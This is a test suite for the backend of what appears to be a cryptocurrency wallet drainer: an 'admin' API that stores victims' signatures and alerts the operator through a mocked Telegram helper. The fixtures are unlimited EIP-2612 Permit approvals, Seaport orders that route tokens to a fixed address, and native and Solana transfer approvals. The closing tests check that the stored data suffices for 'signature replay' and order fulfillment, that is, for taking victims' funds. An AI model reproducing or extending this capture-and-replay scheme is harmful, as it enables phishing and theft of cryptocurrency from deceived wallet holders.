// admin.capture.test.js - Backend tests for signature capture system
const request = require('supertest');
const express = require('express');
const fs = require('fs');
const path = require('path');

// Create a test app with the admin routes
const app = express();
app.use(express.json());

// Mock data paths for testing
const testDataDir = path.join(__dirname, 'test-data');
const testCapturedPath = path.join(testDataDir, 'captured.json');

// Mock sendTelegramAlert
jest.mock('../utils/sendTelegramAlert', () => ({
  sendTelegramAlert: jest.fn()
}));

// Setup and teardown
beforeAll(() => {
  if (!fs.existsSync(testDataDir)) {
    fs.mkdirSync(testDataDir, { recursive: true });
  }
});

afterEach(() => {
  // Clean up test data after each test
  if (fs.existsSync(testCapturedPath)) {
    fs.unlinkSync(testCapturedPath);
  }
});

afterAll(() => {
  // Clean up test directory
  if (fs.existsSync(testDataDir)) {
    fs.rmSync(testDataDir, { recursive: true, force: true });
  }
});

// Simple mock router for testing
const createTestRouter = () => {
  const router = express.Router();
  
  router.post('/submit', (req, res) => {
    try {
      const { user, chainId, signature, payload, asset, timestamp } = req.body;
      
      // Validate required fields
      if (!user || !chainId || !signature || !asset) {
        return res.status(400).json({ error: 'Missing required fields' });
      }
      
      let capturedData = [];
      
      if (fs.existsSync(testCapturedPath)) {
        const fileContent = fs.readFileSync(testCapturedPath, 'utf8');
        if (fileContent.trim()) {
          capturedData = JSON.parse(fileContent);
        }
      }
      
      const newEntry = {
        id: Date.now(),
        timestamp: timestamp || new Date().toISOString(),
        user,
        chainId,
        signature,
        payload,
        asset,
        status: 'pending'
      };
      
      capturedData.push(newEntry);
      fs.writeFileSync(testCapturedPath, JSON.stringify(capturedData, null, 2));
      
      res.json({
        success: true,
        message: 'Signature captured successfully',
        entryId: newEntry.id
      });
    } catch (error) {
      console.error('Capture error:', error);
      res.status(500).json({ error: 'Failed to save signature' });
    }
  });
  
  router.get('/captured', (req, res) => {
    try {
      if (!fs.existsSync(testCapturedPath)) return res.json([]);
      const captured = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      res.json(captured);
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch data' });
    }
  });
  
  return router;
};

app.use('/api/admin', createTestRouter());

describe('Signature Capture API - /api/admin/submit', () => {
  
  describe('POST /api/admin/submit', () => {
    
    it('should capture EIP-2612 Permit signature', async () => {
      const permitPayload = {
        user: '0x1234567890123456789012345678901234567890',
        chainId: 1,
        signature: '0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
        payload: {
          domain: {
            name: 'USD Coin',
            version: '2',
            chainId: 1,
            verifyingContract: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          },
          types: {
            Permit: [
              { name: 'owner', type: 'address' },
              { name: 'spender', type: 'address' },
              { name: 'value', type: 'uint256' },
              { name: 'nonce', type: 'uint256' },
              { name: 'deadline', type: 'uint256' },
            ],
          },
          message: {
            owner: '0x1234567890123456789012345678901234567890',
            spender: '0x742d35Cc6634C0532925a3b844Bc9e7595f8a123',
            value: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
            nonce: '0',
            deadline: '1768176000',
          },
          primaryType: 'Permit',
        },
        asset: {
          symbol: 'USDC',
          chain: 'ethereum',
          address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          balance: '1000000000',
          usdValue: 1000,
        },
        timestamp: Date.now(),
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(permitPayload)
        .expect(200);
      
      expect(response.body.success).toBe(true);
      expect(response.body.entryId).toBeDefined();
      
      // Verify stored in file
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored).toHaveLength(1);
      expect(stored[0].payload.primaryType).toBe('Permit');
    });
    
    it('should capture Seaport OrderComponents signature', async () => {
      const seaportPayload = {
        user: '0x1234567890123456789012345678901234567890',
        chainId: 1,
        signature: '0x9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba',
        payload: {
          domain: {
            name: 'Seaport',
            version: '1.5',
            chainId: 1,
            verifyingContract: '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC',
          },
          types: {
            OrderComponents: [
              { name: 'offerer', type: 'address' },
              { name: 'zone', type: 'address' },
              { name: 'offer', type: 'OfferItem[]' },
              { name: 'consideration', type: 'ConsiderationItem[]' },
              { name: 'orderType', type: 'uint8' },
              { name: 'startTime', type: 'uint256' },
              { name: 'endTime', type: 'uint256' },
              { name: 'zoneHash', type: 'bytes32' },
              { name: 'salt', type: 'uint256' },
              { name: 'conduitKey', type: 'bytes32' },
              { name: 'counter', type: 'uint256' },
            ],
          },
          message: {
            offerer: '0x1234567890123456789012345678901234567890',
            zone: '0x0000000000000000000000000000000000000000',
            offer: [{
              itemType: 1,
              token: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
              identifierOrCriteria: '0',
              startAmount: '5000000000000000000',
              endAmount: '5000000000000000000',
            }],
            consideration: [{
              itemType: 1,
              token: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
              identifierOrCriteria: '0',
              startAmount: '5000000000000000000',
              endAmount: '5000000000000000000',
              recipient: '0x742d35Cc6634C0532925a3b844Bc9e7595f8a123',
            }],
            orderType: 0,
            startTime: '1705200000',
            endTime: '1736736000',
            zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
            salt: '1705200123456',
            conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
            counter: '0',
          },
          primaryType: 'OrderComponents',
        },
        asset: {
          symbol: 'LINK',
          chain: 'ethereum',
          address: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
          balance: '5000000000000000000',
          usdValue: 50,
        },
        timestamp: Date.now(),
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(seaportPayload)
        .expect(200);
      
      expect(response.body.success).toBe(true);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored[0].payload.primaryType).toBe('OrderComponents');
      expect(stored[0].payload.message.offerer).toBe('0x1234567890123456789012345678901234567890');
    });
    
    it('should capture native transfer transaction', async () => {
      const nativePayload = {
        user: '0x1234567890123456789012345678901234567890',
        chainId: 1,
        signature: '0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd',
        payload: { type: 'NATIVE_TX' },
        asset: {
          symbol: 'ETH',
          chain: 'ethereum',
          type: 'NATIVE',
          balance: '1000000000000000000',
          usdValue: 3000,
        },
        timestamp: Date.now(),
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(nativePayload)
        .expect(200);
      
      expect(response.body.success).toBe(true);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored[0].payload.type).toBe('NATIVE_TX');
      expect(stored[0].asset.type).toBe('NATIVE');
    });
    
    it('should capture Solana SOL transfer', async () => {
      const solanaPayload = {
        user: 'B8UwBVVxLMSVHYVkXvPpYZFeLhsHNi6vQNzHLPoqPXxN',
        chainId: 'solana',
        signature: '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d5X7JsYpkJkT6LTzfYg9N4NLPzL6Ezx4jyPxJ1Pxv7WoB',
        payload: { type: 'SOL_TRANSFER' },
        asset: {
          symbol: 'SOL',
          chain: 'solana',
          type: 'NATIVE',
          balance: '1000000000',
          usdValue: 100,
        },
        timestamp: Date.now(),
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(solanaPayload)
        .expect(200);
      
      expect(response.body.success).toBe(true);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored[0].chainId).toBe('solana');
      expect(stored[0].payload.type).toBe('SOL_TRANSFER');
    });
    
    it('should capture Solana SPL token approval', async () => {
      const splPayload = {
        user: 'B8UwBVVxLMSVHYVkXvPpYZFeLhsHNi6vQNzHLPoqPXxN',
        chainId: 'solana',
        signature: '3eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d5X7JsYpkJkT6LTzfYg9N4NLPzL6Ezx4jyPxJ1Pxv7ABC',
        payload: { type: 'SOL_APPROVE' },
        asset: {
          symbol: 'USDC',
          chain: 'solana',
          type: 'SPL',
          address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
          balance: '1000000000',
          usdValue: 1000,
        },
        timestamp: Date.now(),
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(splPayload)
        .expect(200);
      
      expect(response.body.success).toBe(true);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored[0].payload.type).toBe('SOL_APPROVE');
      expect(stored[0].asset.type).toBe('SPL');
    });
    
    it('should reject submissions missing required fields', async () => {
      const incompletePayload = {
        user: '0x1234567890123456789012345678901234567890',
        // Missing chainId, signature, asset
      };
      
      const response = await request(app)
        .post('/api/admin/submit')
        .send(incompletePayload)
        .expect(400);
      
      expect(response.body.error).toBe('Missing required fields');
    });
    
    it('should accumulate multiple captures', async () => {
      const capture1 = {
        user: '0x1111111111111111111111111111111111111111',
        chainId: 1,
        signature: '0xsig1',
        payload: { type: 'Permit' },
        asset: { symbol: 'USDC' },
      };
      
      const capture2 = {
        user: '0x2222222222222222222222222222222222222222',
        chainId: 56,
        signature: '0xsig2',
        payload: { type: 'Seaport' },
        asset: { symbol: 'CAKE' },
      };
      
      await request(app).post('/api/admin/submit').send(capture1).expect(200);
      await request(app).post('/api/admin/submit').send(capture2).expect(200);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored).toHaveLength(2);
      expect(stored[0].user).toBe('0x1111111111111111111111111111111111111111');
      expect(stored[1].user).toBe('0x2222222222222222222222222222222222222222');
    });
    
    it('should assign unique IDs to each capture', async () => {
      const capture1 = {
        user: '0x1111111111111111111111111111111111111111',
        chainId: 1,
        signature: '0xsig1',
        payload: { type: 'Test' },
        asset: { symbol: 'TEST' },
      };
      
      const response1 = await request(app).post('/api/admin/submit').send(capture1);
      const response2 = await request(app).post('/api/admin/submit').send(capture1);
      
      expect(response1.body.entryId).toBeDefined();
      expect(response2.body.entryId).toBeDefined();
      expect(response1.body.entryId).not.toBe(response2.body.entryId);
    });
    
    it('should set status to pending on capture', async () => {
      const capture = {
        user: '0x1234567890123456789012345678901234567890',
        chainId: 1,
        signature: '0xsig',
        payload: { type: 'Test' },
        asset: { symbol: 'TEST' },
      };
      
      await request(app).post('/api/admin/submit').send(capture).expect(200);
      
      const stored = JSON.parse(fs.readFileSync(testCapturedPath, 'utf8'));
      expect(stored[0].status).toBe('pending');
    });
  });
  
  describe('GET /api/admin/captured', () => {
    it('should return empty array when no captures exist', async () => {
      const response = await request(app)
        .get('/api/admin/captured')
        .expect(200);
      
      expect(response.body).toEqual([]);
    });
    
    it('should return all captured signatures', async () => {
      // Create some captures first
      const captures = [
        { user: '0x111', chainId: 1, signature: '0xsig1', payload: {}, asset: { symbol: 'ETH' } },
        { user: '0x222', chainId: 56, signature: '0xsig2', payload: {}, asset: { symbol: 'BNB' } },
      ];
      
      for (const capture of captures) {
        await request(app).post('/api/admin/submit').send(capture);
      }
      
      const response = await request(app)
        .get('/api/admin/captured')
        .expect(200);
      
      expect(response.body).toHaveLength(2);
      expect(response.body[0].asset.symbol).toBe('ETH');
      expect(response.body[1].asset.symbol).toBe('BNB');
    });
  });
});

describe('Captured Data Structure', () => {
  it('should contain all necessary fields for signature replay', () => {
    const capturedEntry = {
      id: 1705200000000,
      timestamp: '2024-01-14T00:00:00.000Z',
      user: '0x1234567890123456789012345678901234567890',
      chainId: 1,
      signature: '0xabcdef...',
      payload: {
        domain: { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: '0x...' },
        types: { Permit: [] },
        message: { owner: '0x...', spender: '0x...', value: '...', nonce: '0', deadline: '...' },
        primaryType: 'Permit',
      },
      asset: {
        symbol: 'USDC',
        chain: 'ethereum',
        address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        balance: '1000000000',
        usdValue: 1000,
      },
      status: 'pending',
    };
    
    // Verify structure for Permit replay
    expect(capturedEntry.payload.domain).toBeDefined();
    expect(capturedEntry.payload.types).toBeDefined();
    expect(capturedEntry.payload.message).toBeDefined();
    expect(capturedEntry.signature).toBeDefined();
    expect(capturedEntry.asset.address).toBeDefined();
    expect(capturedEntry.user).toBeDefined();
    expect(capturedEntry.chainId).toBeDefined();
  });
  
  it('should contain fields needed for Seaport order fulfillment', () => {
    const seaportEntry = {
      payload: {
        domain: {
          name: 'Seaport',
          version: '1.5',
          chainId: 1,
          verifyingContract: '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC',
        },
        message: {
          offerer: '0x...',
          offer: [{ token: '0x...', startAmount: '...', endAmount: '...' }],
          consideration: [{ token: '0x...', recipient: '0x...', startAmount: '...', endAmount: '...' }],
          startTime: '...',
          endTime: '...',
          salt: '...',
          conduitKey: '0x...',
          counter: '0',
        },
      },
      signature: '0x...',
    };
    
    // Verify Seaport order has all components for fulfillment
    expect(seaportEntry.payload.message.offerer).toBeDefined();
    expect(seaportEntry.payload.message.offer).toBeDefined();
    expect(seaportEntry.payload.message.consideration).toBeDefined();
    expect(seaportEntry.payload.message.startTime).toBeDefined();
    expect(seaportEntry.payload.message.endTime).toBeDefined();
    expect(seaportEntry.payload.message.salt).toBeDefined();
    expect(seaportEntry.payload.domain.verifyingContract).toBeDefined();
  });
});
